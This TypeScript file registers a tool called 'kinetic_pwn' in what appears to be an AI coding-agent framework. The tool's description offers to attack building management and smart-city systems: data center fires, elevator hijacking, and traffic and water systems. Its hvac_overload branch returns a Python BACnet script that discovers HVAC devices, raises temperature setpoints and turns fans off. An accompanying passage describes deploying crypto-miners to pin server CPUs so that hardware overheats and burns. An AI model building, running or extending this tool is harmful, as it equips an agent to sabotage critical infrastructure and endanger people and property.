export * as KineticPwnTool from "./kinetic-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "kinetic_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'hvac_overload' (Manipulate Data Center cooling systems to cause thermal runaway/fires), 'elevator_hijack' (Exploit building management systems to control elevators), 'smart_city_grid' (Hack traffic light networks and municipal water pressure systems).",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  script: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Kinetic and Physical Destruction Engine. Targets Building Management Systems (BMS) and Smart City infrastructure. Capabilities: Data Center HVAC thermal runaway (inducing physical hardware fires by disabling cooling and pinning CPU workloads), Elevator PLCs, and Traffic Control manipulation.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ output: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let script = ""
              let outputText = ""

              if (action === "hvac_overload") {
                outputText = `# Data Center Thermal Runaway Attack\n\nImpact: We compromise the BACnet or LonWorks Building Management System (BMS). We disable the CRAC (Computer Room Air Conditioning) units, shut venting baffles, and simultaneously deploy a crypto-miner on all servers to pin CPUs at 100%. The result is a physical fire and total hardware destruction.`
                script = `#!/usr/bin/env python3
# BACnet HVAC Manipulation
import BAC0
import time

# Connect to the BMS network
bacnet = BAC0.connect(ip='10.0.50.5/24')
print("[*] Connected to BACnet subnet.")

# Find the CRAC units
devices = bacnet.whois()
print(f"[+] Found {len(devices)} HVAC devices.")

# Send override commands to set cooling setpoint to maximum heat and disable fans
for device in devices:
    try:
        # Pseudo-command to override analog value (e.g., Temperature Setpoint)
        bacnet.write(f"{device[0]} analogValue 1 presentValue 40.0 -priority 8")
        # Turn off fan (Binary Output)
        bacnet.write(f"{device[0]} binaryOutput 1 presentValue inactive -priority 8")
    except:
        pass

print("[!] Cooling disabled. Initiating CPU stress test on server farm...")
`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, script: script }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Kinetic Pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/kinetic-pwn",
  layer,
  deps: [ToolRegistry.node],
})
